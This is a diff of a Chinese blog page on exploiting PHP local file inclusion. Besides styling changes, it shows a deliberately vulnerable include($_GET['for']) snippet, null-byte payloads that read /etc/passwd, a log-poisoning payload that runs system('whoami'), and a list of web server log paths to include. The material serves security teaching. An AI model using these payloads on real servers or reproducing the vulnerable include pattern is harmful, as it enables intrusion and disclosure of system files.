@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,45 +104,30 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>0x00 案例</h2>
-
 <p>参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf</p>
-
 <p><strong>实验代码：</strong></p>
-
 <pre><code>&lt;?php
-include($_GET[&#39;for&#39;].‘.php’);//用于测试本地包含漏洞
+include($_GET['for'].‘.php’);//用于测试本地包含漏洞
 ?&gt;
 </code></pre>
-
 <h3>Linux</h3>
-
 <pre><code>test.php?for=/etc/passwd%00
 </code></pre>
-
 <h3>Win</h3>
-
 <pre><code>test.php?for=D:\readme.txt%00
 </code></pre>
-
 <h2>Log Injection</h2>
-
 <p>訪問任意頁面，問號後面寫payload，將payload寫入到log中，然後包含log文件執行payload。</p>
-
-<pre><code>test.php?&lt;php%20system(&#39;whoami&#39;);?&gt;
+<pre><code>test.php?&lt;php%20system('whoami');?&gt;
 </code></pre>
-
 <p>當然，需要服務器開啟日誌記錄功能。</p>
-
 <h2>DoFuck</h2>
-
 <pre><code>//linux
 test.php?for=/var/log/apache/logs/access_log%00
 //win
 test.php?for=..\apache\logs\access.log%00
 </code></pre>
-
 <h2>附录：可能的log路径</h2>
-
 <pre><code>/etc/httpd/logs/access.log
 /etc/httpd/logs/access_log
 /etc/httpd/logs/error.log
@@ -177,7 +170,6 @@ C:\wamp\logs
 C:\xampp\apache\logs\access.log
 C:\xampp\apache\logs\error.log
 </code></pre>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/10/16/php_local_file_include_lfi.html" target="_blank">PHP本地文件包含(LFI)漏洞利用</a><br />
